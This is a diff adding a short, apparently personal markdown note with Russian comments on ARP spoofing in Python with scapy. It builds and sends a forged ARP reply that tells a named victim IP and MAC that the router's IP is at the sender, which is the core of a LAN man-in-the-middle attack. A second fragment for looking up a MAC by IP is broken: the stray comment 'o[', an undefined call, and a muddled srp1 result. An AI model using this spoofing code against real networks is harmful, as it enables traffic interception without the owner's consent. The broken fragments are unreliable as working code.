@@ -1,0 +1,37 @@
+### ARP SPOOF PYTHON 
+
+--- packet = scapy.ARP()
+
+	- scapy.ls(scapy.ARP()) # выведет список доступных полей пакета arp
+
+	- packet = scapy.ARP() # создание arp пакета
+
+	
+	- packet.op = 2 # is-at _ тип пакета  arp ответ
+	
+	- packet.pdst = "192.168.0.134" # ip-адрес получателя (жертва)
+
+	- packet.hwdst = "b4:86:55:ea:dc:99" # mac-адрес получателя (жертва)
+
+	- packet.psrc = "192.168.0.1" # ip-адрес отправителя (роутер)	
+
+	scapy.send(packet) # отправить пакет, не ожидаяя ответа 
+
+
+----------
+
+	- packet.hwdst = "58:d9:d5:cc:c0:d0" # o[
+
+	arp_request_broadcast(scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/
+		scapy.ARP(pdst=ip, hwlen=6, plen=4))
+	answered = srp1(arp_request_broadcast, timeout=1, verbose=False)
+	answered[0].hwsrc 
+
+		# код получения мак-адреса по ip
+
+
+
+
+
+	
+	
